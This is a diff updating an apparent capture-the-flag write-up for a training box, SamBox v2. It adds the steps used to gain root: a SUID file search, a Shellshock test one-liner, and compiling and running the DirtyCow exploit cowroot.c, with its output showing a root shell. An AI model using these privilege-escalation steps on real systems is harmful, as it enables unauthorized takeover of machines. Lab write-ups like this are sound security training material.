@@ -1,5 +1,5 @@
 SamBox v2
-time taken: not complete
+time taken: couple of days (finding that dirtyc0w exploit was annoying...)
 
 extra hardmode: this vulnbox is written in French...
 
@@ -211,17 +211,50 @@ local privesc is not working
 
 find / -perm -u=s -type f 2>/dev/null -- lets see if there are any apps that can be run as root...:
 
-usr/bin/chage /usr/bin/chfn /usr/bin/chsh /usr/bin/mount /usr/bin/su /usr/bin/gpasswd /usr/bin/newgrp /usr/bin/passwd /usr/bin/umount /usr/bin/at /usr/bin/pkexec /usr/bin/crontab /usr/bin/staprun /usr/bin/sudo /usr/sbin/unix_chkpwd /usr/sbin/pam_timestamp_check /usr/sbin/usernetctl /usr/sbin/userhelper /usr/lib/polkit-1/polkit-agent-helper-1 find: '/usr/lib/firewalld': Permission denied /usr/lib64/dbus-1/dbus-daemon-launch-helper find: '/usr/share/polkit-1/rules.d': Permission denied find: '/usr/libexec/initscripts/legacy-actions/auditd': Permission denied /usr/libexec/abrt-action-install-debuginfo-to-abrt-cache find: '/home/sam': Permission denied /passwd
 
-nothing...
+
+nothing usefull...
 
 env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
 
 vulnerable, maybe we can use shellshock?
 
+no dice...
 
-fuck if I know tbh. Also I'm hungry af right now. This one is very hard indeed. 
-Managed to get some backdoors but no root yet >:{
-I'll come back to it
+hmm.. dirtyc0w may work here considering how new this is...
+
+after many tries, this dirtyc0w exploit seemed promising (i.e, it didn't crash the server...)
+
+using https://www.exploit-db.com/exploits/40616/
+
+fix up the exploit with appropirate settings (-pthread, set payload to x86) and use
+[admin@ctf03.root-me.org /tmp]$ echo 0 > /proc/sys/vm/dirty_writeback_centisecs
+[admin@ctf03.root-me.org /tmp]$ gcc cowroot.c -o cowroot -pthread
+
+finally found an exploit that compiles. oddly enough this would crash the VM a lot of times before 
+I got it to work....
+
+
+id
+uid=48(apache) gid=48(apache) groups=48(apache)
+gcc cowroot.c -o cowroot -pthread
+ls
+cowroot
+cowroot.c
+./cowroot
+DirtyCow root privilege escalation
+Backing up /usr/bin/passwd.. to /tmp/bak
+Size of binary: 57048
+Racing, this may take a while..
+/usr/bin/passwd is overwritten
+Popping root shell.
+Don't forget to restore /tmp/bak
+thread stopped
+id
+uid=0(root) gid=48(apache) groups=0(root),48(apache)
+
+boom! finally
+
+
 
 
